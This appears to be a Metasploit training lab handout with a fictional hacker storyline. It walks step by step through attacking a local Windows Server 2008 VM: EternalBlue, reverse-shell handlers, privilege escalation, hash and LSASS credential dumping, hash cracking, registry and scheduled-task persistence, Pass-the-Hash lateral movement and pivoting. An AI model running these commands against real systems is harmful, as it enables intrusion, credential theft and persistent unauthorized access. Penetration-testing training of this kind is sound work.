# MSF-201-W — Silver Level: Windows
## Operation: Lazarus Protocol — Chapter 2
### *"Climbing the Ladder"*

---

> *It was Zara's turn.*
>
> *Grim had left a sticky note on her monitor when she arrived: "Session 1. Win2k8. SYSTEM.*
> *EternalBlue. Clean. Backgrounded."*
>
> *She pulled up the terminal, listed sessions, and smiled. She'd seen SYSTEM access before.*
> *Getting it was a high. Keeping it, quietly, for months — that was the art.*
>
> *She started typing. Methodically. Like a surgeon.*
>
> *"Ghost Circuit didn't just visit this network," she muttered to herself.*
> *"They moved in."*

---

## Objectives

By the end of this lab you will be able to:

1. Use **post-exploitation modules** to gather detailed system intelligence
2. Perform **privilege escalation** from a non-SYSTEM session
3. Use `hashdump` and `smart_hashdump` to extract NTLM password hashes
4. **Crack NTLM hashes** using MSF's built-in analyzer and `john`/`hashcat`
5. **Migrate processes** to improve stability and stealth
6. Establish **persistence** on a Windows host
7. Enumerate **domain information** and identify lateral movement targets
8. Perform **Pass-the-Hash** with `psexec` to move laterally

---

## Prerequisites

- Completed MSF-101-W (Bronze Windows)
- Comfortable with basic Meterpreter commands
- Understanding of Windows user/group structure and NTLM authentication

---

## Target

| Property         | Value                        |
|------------------|------------------------------|
| OS               | Windows Server 2008 R2 SP1   |
| IP               | `192.168.56.103` (verify!)   |
| Attacker IP      | `192.168.56.1`               |

---

## Background: NTLM Authentication and Pass-the-Hash

Windows uses **NTLM hashes** to store local account passwords. When a user logs in,
Windows doesn't store the plaintext — it stores an MD4 hash of the password.

The critical insight: **you don't always need to crack the hash**.
Many Windows services accept NTLM hashes directly for authentication.
An attacker who steals a hash can authenticate *as that user without knowing
the password*. This is called **Pass-the-Hash (PtH)** and it has been a cornerstone
of Windows post-exploitation since the 1990s. Microsoft has never been able to
fully eliminate it without breaking backwards compatibility.

---

## Phase 0 — Re-establish Your Foothold

If you don't have an active session from the Bronze lab, re-exploit EternalBlue:

```bash
sudo service postgresql start
msfconsole -q

msf6 > workspace -a msf201-windows

msf6 > use exploit/windows/smb/ms17_010_eternalblue
msf6 exploit(ms17_010_eternalblue) > set RHOSTS 192.168.56.103
msf6 exploit(ms17_010_eternalblue) > set LHOST 192.168.56.1
msf6 exploit(ms17_010_eternalblue) > set LPORT 4444
msf6 exploit(ms17_010_eternalblue) > run

msf6 > sessions
# Note your session ID for the steps below
```

---

## Phase 1 — Advanced Session Management

### 1.1 — Process Migration

Raw Meterpreter sessions are fragile — if the exploited process dies, so does your
shell. **Process migration** moves your session into a more stable process.

```bash
msf6 > sessions -i 1

# List processes
meterpreter > ps

# Identify stable processes to migrate into:
#   - explorer.exe   (user desktop — good for long sessions)
#   - svchost.exe    (system service — stealthy, but careful which one)
#   - lsass.exe      (highest privilege, but crashing it bluescreens the system!)

# Migrate to explorer.exe (note the PID from ps output)
meterpreter > migrate <PID_of_explorer.exe>

# Verify migration succeeded
meterpreter > getpid
meterpreter > getuid
```

> **Why migrate?** The EternalBlue exploit spawns a fragile process. `explorer.exe`
> is stable and expected to be running at all times — it's part of the user desktop.
> Ghost Circuit would have migrated immediately to avoid losing their foothold.

### 1.2 — Persist the Session in Memory

Before doing anything risky, get a second session as backup:

```bash
# Background current session
meterpreter > background

# Set up a persistent handler that auto-restores sessions
msf6 > use exploit/multi/handler
msf6 exploit(handler) > set PAYLOAD windows/x64/meterpreter/reverse_tcp
msf6 exploit(handler) > set LHOST 192.168.56.1
msf6 exploit(handler) > set LPORT 5555
msf6 exploit(handler) > set ExitOnSession false    # Keep listening after getting a session
msf6 exploit(handler) > run -j                      # Run as background job

# Check the job is running
msf6 > jobs
```

---

## Phase 2 — Privilege Escalation

Not every exploit gives you SYSTEM. What if you land as a low-privilege user?
(This scenario: start as the `vagrant` user instead of SYSTEM.)

### 2.1 — Simulate Low-Privilege Access

```bash
# Interact with your session
msf6 > sessions -i 1
meterpreter > getuid

# If you have SYSTEM — let's practice anyway. Drop to a lower context temporarily
# (or re-exploit via a different vector like Tomcat that gives you a web service account)
```

### 2.2 — Local Exploit Suggester

The local exploit suggester checks the target system and suggests applicable
local privilege escalation modules:

```bash
meterpreter > background

msf6 > use post/multi/recon/local_exploit_suggester
msf6 post(local_exploit_suggester) > set SESSION 1
msf6 post(local_exploit_suggester) > run
```

**This is one of the most valuable modules in MSF.** It will return a list of
potential local privilege escalation vectors ranked by probability.

Common results on Windows Server 2008:
- `exploit/windows/local/ms16_032_secondary_logon_handle_privesc`
- `exploit/windows/local/ms16_075_reflection_juicy`
- `exploit/windows/local/bypassuac_eventvwr`
- `exploit/windows/local/tokenmagic`

### 2.3 — Exploit MS16-032 (Secondary Logon Handle Privesc)

```bash
msf6 > use exploit/windows/local/ms16_032_secondary_logon_handle_privesc
msf6 exploit(ms16_032) > set SESSION 1
msf6 exploit(ms16_032) > set LHOST 192.168.56.1
msf6 exploit(ms16_032) > set LPORT 6666
msf6 exploit(ms16_032) > run
```

Expected: a new Meterpreter session with `NT AUTHORITY\SYSTEM`.

### 2.4 — Token Impersonation (Juicy / Rotten Potato)

Windows service accounts often have the `SeImpersonatePrivilege` token, which can be
abused to impersonate SYSTEM:

```bash
msf6 > sessions -i 1

# Check current privileges
meterpreter > getprivs

# If SeImpersonatePrivilege is listed:
meterpreter > load incognito
meterpreter > list_tokens -u
meterpreter > impersonate_token "NT AUTHORITY\\SYSTEM"
meterpreter > getuid
```

> **Context:** This token abuse technique — often called "Potato" attacks — is why
> web application pools and service accounts should **never** have
> SeImpersonatePrivilege unless absolutely required. Yet it remains extremely common
> in real enterprise environments.

---

## Phase 3 — Credential Harvesting

### 3.1 — Hash Dump with Meterpreter

The SAM database stores local user account NTLM hashes. `hashdump` reads it directly.

```bash
# Requires SYSTEM
meterpreter > hashdump
```

Expected output format:
```
Administrator:500:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
vagrant:1001:aad3b435b51404eeaad3b435b51404ee:e02bc503339d51f71d913c245d35b50b:::
Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
```

Format: `username:RID:LM_hash:NTLM_hash:::`

The LM hash `aad3b435b51404eeaad3b435b51404ee` means LM authentication is disabled
(empty LM hash placeholder). The NTLM hash is what matters.

### 3.2 — Smart Hash Dump (More Thorough)

```bash
meterpreter > background

msf6 > use post/windows/gather/smart_hashdump
msf6 post(smart_hashdump) > set SESSION 1
msf6 post(smart_hashdump) > set GETLOCAL true
msf6 post(smart_hashdump) > run
```

The smart dump also retrieves hashes from:
- Domain controllers (if available)
- VSS shadow copies
- Active registry hives

### 3.3 — Crack the Hashes

**Method A: MSF built-in cracker**
```bash
msf6 > use auxiliary/analyze/crack_windows
msf6 auxiliary(crack_windows) > run
```

**Method B: John the Ripper (outside MSF)**
```bash
# Save the hashes to a file first (in meterpreter or from creds database)
msf6 > creds -o /tmp/hashes.txt

# Run john with rockyou wordlist
john --wordlist=/usr/share/wordlists/rockyou.txt --format=NT /tmp/hashes.txt
john --show /tmp/hashes.txt
```

**Method C: Hashcat (GPU accelerated)**
```bash
# Extract just NTLM hashes
cat /tmp/hashes.txt | cut -d: -f4 > /tmp/ntlm_only.txt

# Run hashcat with rockyou
hashcat -m 1000 -a 0 /tmp/ntlm_only.txt /usr/share/wordlists/rockyou.txt
hashcat -m 1000 --show /tmp/ntlm_only.txt
```

> **What does cracking the hash give you that PtH doesn't?** The actual **plaintext
> password**. Humans reuse passwords. The `vagrant` account password might be the
> same as the domain admin's email password. This is why credential cracking matters
> even when you already have elevated access.

### 3.4 — Credential Collection Beyond SAM

```bash
msf6 > sessions -i 1

# Collect all browser saved passwords, credential stores, etc.
msf6 > use post/windows/gather/credentials/credential_collector
msf6 post(credential_collector) > set SESSION 1
msf6 post(credential_collector) > run

# Get logged-on users
msf6 > use post/windows/gather/enum_logged_on_users
msf6 post(enum_logged_on_users) > set SESSION 1
msf6 post(enum_logged_on_users) > run

# Review all collected credentials
msf6 > creds
```

---

## Phase 4 — Establishing Persistence

> *"Ghost Circuit was in Nexus Dynamics for three months. EternalBlue wouldn't survive*
> *a reboot. They had a secondary access method. Then a tertiary. Defense in depth for*
> *attackers — redundant persistence."*
> — Zara's briefing notes

### 4.1 — Persistence via Registry Run Key

```bash
msf6 > use post/windows/manage/persistence
msf6 post(persistence) > set SESSION 1
msf6 post(persistence) > set STARTUP REGISTRY    # Registry Run key
msf6 post(persistence) > set LHOST 192.168.56.1
msf6 post(persistence) > set LPORT 7777
msf6 post(persistence) > run
```

**What this does:** Installs a Meterpreter payload as a startup item in
`HKCU\Software\Microsoft\Windows\CurrentVersion\Run`. Every time the user logs in,
Meterpreter connects back to your listener.

```bash
# Set up the listener to receive the persistent callback
msf6 > use exploit/multi/handler
msf6 exploit(handler) > set PAYLOAD windows/meterpreter/reverse_tcp
msf6 exploit(handler) > set LHOST 192.168.56.1
msf6 exploit(handler) > set LPORT 7777
msf6 exploit(handler) > run -j
```

### 4.2 — Persistence via Scheduled Task

```bash
msf6 > use post/windows/manage/persistence_exe
msf6 post(persistence_exe) > set SESSION 1
msf6 post(persistence_exe) > set STARTUP SCHEDULER
msf6 post(persistence_exe) > set LHOST 192.168.56.1
msf6 post(persistence_exe) > set LPORT 7778
msf6 post(persistence_exe) > run
```

> **Blue Team Perspective:** Both Registry Run keys and Scheduled Tasks are among
> the most heavily monitored persistence locations by EDR tools and SIEMs today.
> For the Gold level, you'll see more evasive methods. But these work on systems
> without modern endpoint security — which is exactly what Nexus Dynamics had.

### 4.3 — Test Persistence

```bash
# In VirtualBox — reboot the Windows target
# (Use VirtualBox GUI or: in meterpreter > shell > shutdown /r /t 0)

# Wait ~2 minutes, then check if a new session appears
msf6 > sessions
```

---

## Phase 5 — Network Enumeration and Domain Recon

### 5.1 — Network Discovery from the Compromised Host

```bash
msf6 > sessions -i 1

meterpreter > ipconfig
meterpreter > arp
meterpreter > route

# Run an ARP scan of the local subnet
msf6 > use post/multi/gather/ping_sweep
msf6 post(ping_sweep) > set RHOSTS 10.0.2.0/24    # Use the second NIC range you found
msf6 post(ping_sweep) > set SESSION 1
msf6 post(ping_sweep) > run
```

### 5.2 — Port Scan Through the Compromised Host

```bash
msf6 > use auxiliary/scanner/portscan/tcp
msf6 auxiliary(tcp) > set RHOSTS 10.0.2.0/24
msf6 auxiliary(tcp) > set PORTS 22,80,135,139,443,445,3389,8080
msf6 auxiliary(tcp) > set CONCURRENCY 20
msf6 auxiliary(tcp) > run
```

### 5.3 — Domain Enumeration

```bash
msf6 > use post/windows/gather/enum_domain
msf6 post(enum_domain) > set SESSION 1
msf6 post(enum_domain) > run

# Enumerate domain users
msf6 > use post/windows/gather/enum_domain_users
msf6 post(enum_domain_users) > set SESSION 1
msf6 post(enum_domain_users) > run

# Enumerate domain shares
msf6 > use post/windows/gather/enum_shares
msf6 post(enum_shares) > set SESSION 1
msf6 post(enum_shares) > run
```

---

## Phase 6 — Pass-the-Hash Lateral Movement

### 6.1 — Identify Another Target

From your domain/network enumeration, identify another host on the network.
For this lab, use the second Metasploitable3 VM if you have both running,
or target a second service on the same host.

### 6.2 — PSExec with NTLM Hash

```bash
msf6 > use exploit/windows/smb/psexec
msf6 exploit(psexec) > info

# Configure with harvested NTLM hash (no password needed!)
msf6 exploit(psexec) > set RHOSTS <target_ip>
msf6 exploit(psexec) > set SMBUser Administrator
msf6 exploit(psexec) > set SMBPass aad3b435b51404eeaad3b435b51404ee:<NTLM_HASH>
                     #  ↑ This format: LM_hash:NTLM_hash
msf6 exploit(psexec) > set LHOST 192.168.56.1
msf6 exploit(psexec) > set PAYLOAD windows/x64/meterpreter/reverse_tcp
msf6 exploit(psexec) > run
```

> **This is the core of Pass-the-Hash:** You never needed the password. You never
> cracked anything. You took the hash from one system and used it directly to
> authenticate to another. This is why Windows credential hygiene (LAPS, tiered
> accounts, credential guard) matters so much.

### 6.3 — Windows Credential Editor (WCE) via Meterpreter

```bash
msf6 > sessions -i 1

# Extract cleartext passwords from LSASS memory (Mimikatz-style via MSF)
meterpreter > load kiwi   # Load the Kiwi extension (Mimikatz port)

meterpreter > creds_all   # Dump ALL credentials (hashes + cleartext where available)
meterpreter > lsa_dump_sam    # Dump SAM database
meterpreter > lsa_dump_secrets # Dump LSA secrets

# If you get cleartext passwords from WDigest (Server 2008 still caches them):
meterpreter > creds_wdigest
```

> **Why does Kiwi/Mimikatz work?** On Windows Server 2008 and older, Windows stores
> a reversible version of credentials in memory (WDigest authentication). Microsoft
> disabled this in Windows 8.1/Server 2012 R2 — but many enterprises ran legacy
> systems. Ghost Circuit targeted organizations that hadn't updated.

---

## Phase 7 — Pivoting Setup (Preview for Gold)

### 7.1 — Add a Pivot Route

```bash
# Get routing info from the current session
meterpreter > run get_local_subnets

# Add a route through the compromised host to the internal network
meterpreter > background

msf6 > route add 10.0.2.0/24 1   # 1 = session ID
msf6 > route print
```

### 7.2 — Test the Pivot

```bash
# Port scan through the pivot route
msf6 > use auxiliary/scanner/portscan/tcp
msf6 auxiliary(tcp) > set RHOSTS 10.0.2.1
msf6 auxiliary(tcp) > set PORTS 445,3389,80
msf6 auxiliary(tcp) > run
```

The traffic flows: `Your machine → Meterpreter session → Target via 10.0.2.x`
The internal target never sees your IP — it only sees the compromised host.
This is precisely how APTs maintain anonymity inside a network.

---

## Deliverables

- [ ] **D1:** Screenshot of `local_exploit_suggester` output (list of local privesc candidates)
- [ ] **D2:** Screenshot of `getuid` showing `NT AUTHORITY\SYSTEM` (from privesc module)
- [ ] **D3:** Screenshot of `hashdump` output (blur actual hash values in report, show format)
- [ ] **D4:** Evidence of at least one persistence mechanism (registry key screenshot or scheduled task)
- [ ] **D5:** Screenshot of `creds_all` or `kiwi` output from LSASS
- [ ] **D6:** Screenshot of successful PSExec lateral movement (or PtH attempt)
- [ ] **D7:** Answer the following discussion questions:

**Discussion Questions:**

1. You used `post/multi/recon/local_exploit_suggester` which checks for local privesc
   vectors. In a real engagement, what **information does this module leak to blue team
   sensors** when it runs? Is there a stealthier approach?

2. Pass-the-Hash has existed since at least 1997. Microsoft has tried to mitigate it with
   Protected Users security group, Credential Guard, and LAPS. Research **one of these
   mitigations** and explain: (a) how it works, (b) what it prevents, and (c) what it
   **does not** prevent.

3. You established persistence via a Registry Run key. A blue team analyst running
   Autoruns (Sysinternals) would see this immediately. Name **two more evasive**
   persistence mechanisms on Windows and explain why they're harder to detect.

---

## Cleanup

```bash
# Kill all sessions
msf6 > sessions -K

# Remove persistence (if you want to clean up the VM without reverting)
msf6 > use post/windows/manage/persistence_exe
msf6 post(persistence_exe) > set SESSION 1
msf6 post(persistence_exe) > set CLEANUP true
msf6 post(persistence_exe) > run

# Or just revert snapshot
VBoxManage snapshot "metasploitable3-win2k8" restore "clean-state"
```

---

## What's Next?

You can now:
- Escalate privileges on a compromised Windows host
- Extract and crack NTLM hashes
- Persist through reboots
- Begin pivoting into adjacent network segments

In **MSF-301-W (Gold)**, the team coordinates a full-chain attack:
custom payload generation with `msfvenom`, advanced evasion, deep pivoting,
domain compromise, and controlled data exfiltration.

*"Every domain admin account is just a hash dump and a Pass-the-Hash away."*
— Zara "0x1A" Chen

---

## Reference

| Module | Purpose |
|--------|---------|
| `post/multi/recon/local_exploit_suggester` | Identify local privesc vectors |
| `exploit/windows/local/ms16_032_secondary_logon_handle_privesc` | Local privesc |
| `post/windows/gather/smart_hashdump` | Comprehensive NTLM hash extraction |
| `auxiliary/analyze/crack_windows` | MSF hash cracking |
| `post/windows/manage/persistence` | Registry run-key persistence |
| `post/windows/manage/persistence_exe` | Scheduled task persistence |
| `post/windows/gather/enum_domain` | Domain enumeration |
| `post/windows/gather/enum_logged_on_users` | Logged-on users |
| `exploit/windows/smb/psexec` | PSExec / Pass-the-Hash |
| `post/multi/gather/ping_sweep` | ARP ping sweep |
| `post/multi/manage/autoroute` | Add pivot routes |
| `kiwi` (Meterpreter extension) | Credential dumping (Mimikatz port) |
